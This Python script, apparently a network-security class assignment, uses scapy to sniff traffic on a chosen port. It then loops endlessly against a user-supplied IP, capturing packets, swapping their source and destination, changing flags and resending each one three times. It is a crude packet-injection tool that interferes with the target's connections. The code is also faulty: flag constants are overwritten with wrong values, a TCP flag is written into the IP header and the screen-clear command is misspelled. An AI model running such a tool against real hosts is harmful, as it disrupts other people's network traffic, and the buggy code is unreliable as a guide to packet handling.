from base64 import b64encode
from collections import Counter

from scapy.all import *
from scapy.layers.inet import IP

import time
import os
os.system('clc' if os.name == 'nt' else 'clear')

class Assignment2_2(object):
    URL_Local = "127.0.0.1"
    URL = ""

    flag_fin = 0x01 #define TH_FIN 0x01
    flag_syn = 0x02 #define TH_SYN 0x02
    flag_rst = 0x04 #define TH_RST 0x04
    flag_push = 0x08 #define TH_PUSH 0x08
    flag_ack = 0x10 #define TH_ACK 0x10
    flag_syn = 0x12 #open port
    flag_rst = 0x14 #closed port
    flag_urg = 0x20 #define TH_URG 0x20
    flag_ece = 0x40 #define TH_ECE 0x40
    flag_cwr = 0x80 #define TH_CWR 0x80

    def __init__(self):
        print("\033c", end="")
        print("Assignment2_2")
        port = input("\nType the port pls and then press enter\n")
        print("\nGiving an overview of network traffic")
        self.WatchAllNetwork(port)
        
        userIn = input("\nType the ip pls and then press enter\nOR type l or L for local ip\n")

        if userIn == "":
            input("\nNo input, press enter to type again...")
            self.__init__()
        elif userIn == "l" or userIn == "L":
            self.URL = self.URL_Local
        else:
            self.URL = userIn
            
        print("Using IP: " + self.URL + ", with port: " + port)
        self.AttackClient(self.URL, port)
        
    def printPackage(self, packet):
        print("Source IP:" + str(packet[IP].src) + "\t\t, Distination IP:" + str(packet[IP].dst) + 
        "\t\t, Protocol:" + str(packet[IP].proto) + "\t, Flag:" + str(packet[IP].flags))

    def TamperPackage(self, package):
        package[IP].flags = self.flag_ack
        srcIP = package[IP].src
        dstIP = package[IP].dst
        package[IP].src = dstIP
        package[IP].dst = srcIP
        try:
            print("\n Sending 3 ack to: " + str(srcIP))
            sendp(package)
            sendp(package)
            sendp(package)
        except:
            print("Small chrash avoid...")

    def WatchAllNetwork(self, port):
        sniff(filter="ip" + " and port " + port, prn=self.printPackage, count=10)


    def AttackClient(self, address, port):
        while(True):
            sniff(filter="host " + address + " and port " + port, prn=self.TamperPackage, count=1)


assignment2_2 = Assignment2_2()
